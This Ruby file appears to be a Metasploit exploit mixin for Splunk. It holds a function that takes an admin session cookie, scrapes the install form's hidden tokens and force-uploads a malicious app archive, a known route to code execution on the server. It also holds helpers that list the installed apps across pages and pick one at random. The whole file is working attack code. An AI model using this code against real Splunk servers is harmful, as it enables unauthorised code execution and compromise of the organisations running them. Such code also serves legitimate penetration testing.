# -*- coding: binary -*-

# This module provides a way of interacting with Splunk apps
module Msf::Exploit::Remote::HTTP::Splunk::Apps
  # Uploads malicious app to splunk using admin cookie
  #
  # @param app_name [String] Name of the app to upload
  # @param cookie [String] Valid admin's cookie
  # @return [Boolean] true on success, false on error
  def splunk_upload_app(app_name, cookie)
    res = send_request_cgi({
      'uri' => splunk_upload_url,
      'method' => 'GET',
      'cookie' => cookie
    })

    unless res&.code == 200
      vprint_error('Unable to get form state')
      return false
    end

    html = res.get_html_document

    data = Rex::MIME::Message.new
    # fill the hidden fields from the form: state and splunk_form_key
    html.at('[id="installform"]').elements.each do |form|
      next unless form.attributes['value']

      data.add_part(form.attributes['value'].to_s, nil, nil, "form-data; name=\"#{form.attributes['name']}\"")
    end
    data.add_part('1', nil, nil, 'form-data; name="force"')
    data.add_part(splunk_helper_malicious_app(app_name), 'application/gzip', 'binary', "form-data; name=\"appfile\"; filename=\"#{app_name}.tar.gz\"")
    post_data = data.to_s

    res = send_request_cgi({
      'uri' => splunk_upload_url,
      'method' => 'POST',
      'cookie' => cookie,
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => post_data
    })

    unless (res&.code == 303 || (res.code == 200 && res.body !~ /There was an error processing the upload/))
      vprint_error('Error uploading App')
      return false
    end

    true
  end

  # Retrieves a list of installed Splunk apps along with their status
  #
  # @param cookie [String] Valid admin's cookie
  # @return [Hash] A hash where keys are app names and values are hashes with app status
  def get_apps(cookie)
    apps = {}
    vars_get = {}

    max_pages = 250
    max_pages.times do |page_num|
      res = send_request_cgi(
        'uri' => splunk_apps_url,
        'method' => 'GET',
        'cookie' => cookie,
        'vars_get' => vars_get
      )

      unless res&.code == 200
        fail_with(Msf::Module::Failure::UnexpectedReply, "#{peer} - Failed to retrieve apps (HTTP #{res&.code})")
      end

      html = res.get_html_document
      table = html.at('table.splTable')
      break unless table

      table.css('tr').each do |row|
        name_td = row.at('td.col-generic.col-2')
        status_td = row.at('td.col-status.col-7')

        next unless name_td && status_td

        status_link = status_td.at('a[onclick*="doObjectAction"]')
        action_type = status_link&.[]('onclick')&.slice(/doObjectAction\('(disable|enable)'/, 1)
        enabled = action_type != 'enable'

        name = name_td.text.strip
        apps[name] = { enabled: enabled }
      end

      vars_get = extract_next_page_vars(html)
      break unless vars_get

      if page_num == max_pages - 1
        print_warning("Reached maximum page limit (#{max_pages}). Some apps might be missing.")
      end
    end

    apps
  end

  # Selects a random Splunk app from the installed apps, optionally filtered by criteria
  #
  # @param cookie [String] Valid admin's cookie
  # @param filter [Hash] Optional filter criteria (e.g., status: 'enabled')
  # @return [String, nil] The name of a random app matching the filter, or nil if none found
  def get_random_app(cookie, filter = {})
    all_apps = get_apps(cookie)
    filtered_apps = filter_apps(all_apps, filter).keys

    filtered_apps.sample
  end
end
